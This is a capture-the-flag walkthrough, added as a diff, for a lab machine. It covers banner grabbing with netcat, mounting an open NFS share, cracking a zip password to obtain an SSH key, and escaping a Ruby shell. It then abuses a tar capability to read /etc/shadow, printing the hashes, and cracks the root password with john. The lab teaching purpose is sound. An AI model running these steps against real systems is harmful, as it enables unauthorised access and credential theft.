@@ -1,0 +1,316 @@
+IP:10.10.200.111
+
+Nmap scan results:
+
+Enumerate your way through 1337.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -sV -p1337 10.10.200.111
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-06 14:52 IST
+Nmap scan report for 10.10.200.111
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE VERSION
+1337/tcp open  waste?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.80%I=7%D=11/6%Time=5FA515E5%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,A7,"Welcome\x20traveller,\x20to\x20the\x20beginning\x20of\x20your\x2
+SF:0journey\nTo\x20begin,\x20find\x20the\x20trollface\nLegend\x20says\x20h
+SF:e's\x20hiding\x20in\x20the\x20first\x20100\x20ports\nTry\x20printing\x2
+SF:0the\x20banners\x20from\x20the\x20ports");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.07 seconds
+root@LAPTOP-U5913CMD:/home/akshay/Desktop#
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# nc 10.10.200.111 1337
+Welcome traveller, to the beginning of your journey
+To begin, find the trollface
+Legend says he's hiding in the first 100 ports
+Try printing the banners from the ports
+
+
+Lets scan the first hundred ports
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# for i in {1..100}; do (sleep 1; echo "get /") | nc 10.10.200.111 $i | grep 550 ; done
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
+550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
+550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
+550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
+550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
+550 12345 0fffffffff000088808880000000000000088800000008fffffff00
+550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
+550 12345 0ffffffff000000888000000000800000080000008800007fffff00
+550 12345 0fffffff8000000000008888000000000080000000000007fffff00
+550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
+550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
+550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
+550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
+550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
+550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
+550 12345 0f7000f800770008777 go to port###### 80008f7f700880cf00
+550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
+550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
+550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
+550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
+550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
+550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
+550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
+550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
+550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
+550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
+550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
+550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
+550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
+550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
+550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
+550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
+550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
+550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
+550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
+550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
+550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
+550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
+550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
+550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
+550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+550 12345 0000000000000000000000000000000000000000000000000000000
+
+
+go to port ######
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# nmap -sV -p##### 10.10.200.111
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-06 15:17 IST
+Nmap scan report for 10.10.200.111
+Host is up (0.14s latency).
+
+PORT      STATE SERVICE VERSION
+######/tcp open  netbus?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port#####-TCP:V=7.80%I=7%D=11/6%Time=5FA51BC3%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,6F,"NFS\x20shares\x20are\x20cool,\x20especially\x20when\x20they\x20
+SF:are\x20misconfigured\nIt's\x20on\x20the\x20standard\x20port,\x20no\x20n
+SF:eed\x20for\x20another\x20scan");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.93 seconds
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell#
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# nc 10.10.200.111 #####
+NFS shares are cool, especially when they are misconfigured
+It's on the standard port, no need for another scan
+
+
+root@LAPTOP-U5913CMD:/home/akshay# showmount -e 10.10.200.111
+Export list for 10.10.200.111:
+/home/nfs *
+
+root@LAPTOP-U5913CMD:/home/akshay# mount -t nfs 10.10.200.111:/home/nfs /tmp/nfs
+root@LAPTOP-U5913CMD:/home/akshay# cd /tmp
+root@LAPTOP-U5913CMD:/tmp# cd nfs
+root@LAPTOP-U5913CMD:/tmp/nfs# ls -la
+total 16
+drwxr-xr-x  2 nobody nogroup 4096 Sep 16 03:41 .
+drwxrwxrwt 56 root   root    4096 Nov  6 15:25 ..
+-rw-r--r--  1 root   root    4534 Sep 16 03:41 backup.zip
+root@LAPTOP-U5913CMD:/tmp/nfs#
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# fcrackzip -D -p /home/akshay/Downloads/rockyou.txt -u backup.zip
+
+
+PASSWORD FOUND!!!!: pw == zxcvbnm
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# unzip backup.zip
+Archive:  backup.zip
+[backup.zip] home/hades/.ssh/id_rsa password:
+  inflating: home/hades/.ssh/id_rsa
+ extracting: home/hades/.ssh/hint.txt
+  inflating: home/hades/.ssh/authorized_keys
+ extracting: home/hades/.ssh/flag.txt
+  inflating: home/hades/.ssh/id_rsa.pub
+
+
+So the ssh port is between 2500-4500
+Lets scan the network once again.
+
+ nmap -p 2500-4500 10.10.200.111 -o ssh_find
+
+root@LAPTOP-U5913CMD:/home/akshay# cat ssh_find | grep ssh
+# Nmap 7.80 scan initiated Fri Nov  6 15:41:21 2020 as: nmap -p 2500-4500 -o ssh_find 10.10.200.111
+3897/tcp open  sdo-ssh
+4334/tcp open  netconf-ch-ssh
+
+That didn't worked.So lets write a for loop to get this done.
+
+for i in {2500..4500}; do echo "get /"; ssh -i id_rsa hades@10.10.200.111 -p $i; done
+
+After enumerating for a bit, I got the port for ssh.
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell/home/hades/.ssh# ssh -i id_rsa hades@10.10.22.183 -p ####
+The authenticity of host '[10.10.22.183]:#### ([10.10.22.183]:####)' can't be established.
+ECDSA key fingerprint is SHA256:xT5f2qKwN5vWrUVIEkkL92j1vcb/XjF9tIHoW/vyyx8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.22.183]:####' (ECDSA) to the list of known hosts.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+ ██░ ██ ▓█████  ██▓     ██▓
+▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
+▒██▀▀██░▒███   ▒██░    ▒██░
+░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
+░▓█▒░██▓░▒████▒░██████▒░██████▒
+ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
+ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
+ ░  ░░ ░   ░     ░ ░     ░ ░
+ ░  ░  ░   ░  ░    ░  ░    ░  ░
+
+ Welcome to hell. We hope you enjoy your stay!
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+ ██░ ██ ▓█████  ██▓     ██▓
+▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
+▒██▀▀██░▒███   ▒██░    ▒██░
+░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
+░▓█▒░██▓░▒████▒░██████▒░██████▒
+ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
+ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
+ ░  ░░ ░   ░     ░ ░     ░ ░
+ ░  ░  ░   ░  ░    ░  ░    ░  ░
+
+ Welcome to hell. We hope you enjoy your stay!
+ irb(main):001:0> id
+Traceback (most recent call last):
+        2: from /usr/bin/irb:11:in `<main>'
+        1: from (irb):1
+NameError (undefined local variable or method `id' for main:Object)
+irb(main):002:0>
+
+
+So this is a ruby shell and I researched for a bit and found we can escape the shell using exec command.
+
+
+irb(main):021:0> exec "/bin/sh"
+$ id
+uid=1002(hades) gid=1002(hades) groups=1002(hades)
+$
+
+
+To make it more stable,we can make the use of python3
+
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+hades@hell:~$ id
+uid=1002(hades) gid=1002(hades) groups=1002(hades)
+hades@hell:~$
+
+Privilege escalation.
+
+hades@hell:/home$ getcap -r / 2>/dev/null
+/usr/bin/mtr-packet = cap_net_raw+ep
+/bin/tar = cap_dac_read_search+ep
+hades@hell:/home$
+
+
+hades@hell:/home$ getcap -r / 2>/dev/null
+/usr/bin/mtr-packet = cap_net_raw+ep
+/bin/tar = cap_dac_read_search+ep
+hades@hell:/home$ /bin/tar -cvf /tmp/shadow.tar /etc/shadow
+/bin/tar: Removing leading `/' from member names
+/etc/shadow
+hades@hell:/home$ cd /tmp
+hades@hell:/tmp$ cat shadow.tar
+etc/shadow0000640000000000000520000000215613730236016012051 0ustar  rootshadowroot:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
+daemon:*:18513:0:99999:7:::
+bin:*:18513:0:99999:7:::
+sys:*:18513:0:99999:7:::
+sync:*:18513:0:99999:7:::
+games:*:18513:0:99999:7:::
+man:*:18513:0:99999:7:::
+lp:*:18513:0:99999:7:::
+mail:*:18513:0:99999:7:::
+news:*:18513:0:99999:7:::
+uucp:*:18513:0:99999:7:::
+proxy:*:18513:0:99999:7:::
+www-data:*:18513:0:99999:7:::
+backup:*:18513:0:99999:7:::
+list:*:18513:0:99999:7:::
+irc:*:18513:0:99999:7:::
+gnats:*:18513:0:99999:7:::
+nobody:*:18513:0:99999:7:::
+systemd-network:*:18513:0:99999:7:::
+systemd-resolve:*:18513:0:99999:7:::
+syslog:*:18513:0:99999:7:::
+messagebus:*:18513:0:99999:7:::
+_apt:*:18513:0:99999:7:::
+lxd:*:18513:0:99999:7:::
+uuidd:*:18513:0:99999:7:::
+dnsmasq:*:18513:0:99999:7:::
+landscape:*:18513:0:99999:7:::
+sshd:*:18513:0:99999:7:::
+pollinate:*:18513:0:99999:7:::
+vagrant:$6$XQAwkysB$wSkezwLStg6E8nT/h5ECcNdiBuGt98yNnjwVEB.YVEAQY9z5AamgBhYTUAzKRQjmNxpEOLP/a36mxdZyaKJk60:18513:0:99999:7:::
+ubuntu:!:18520:0:99999:7:::
+statd:*:18520:0:99999:7:::
+ntp:*:18520:0:99999:7:::
+hades:*:18520:0:99999:7:::
+hades@hell:/tmp$
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# nano shadow
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell# john shadow --wordlist=/home/akshay/Downloads/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+trustno1         (root)
+1g 0:00:00:04 0.12% (ETA: 17:16:29) 0.2222g/s 4437p/s 4778c/s 4778C/s john23..230190
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/serverFromHell#
+
+hades@hell:/tmp$ su root
+Password:
+root@hell:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@hell:/tmp# cd /root
+root@hell:~# ls -la
+total 36
+drwx------  5 root root 4096 Sep 15 22:12 .
+drwxr-xr-x 24 root root 4096 Nov  6 10:17 ..
+-rw-------  1 root root  143 Sep 15 22:13 .bash_history
+-rw-r--r--  1 root root 3771 Sep 15 22:11 .bashrc
+drwx------  2 root root 4096 Sep 15 22:11 .cache
+drwx------  3 root root 4096 Sep 15 22:11 .gnupg
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Sep 15 22:10 .ssh
+-rw-r--r--  1 root root   25 Sep 15 22:11 root.txt
+
+
+Thank you.. Happy Hacking :)
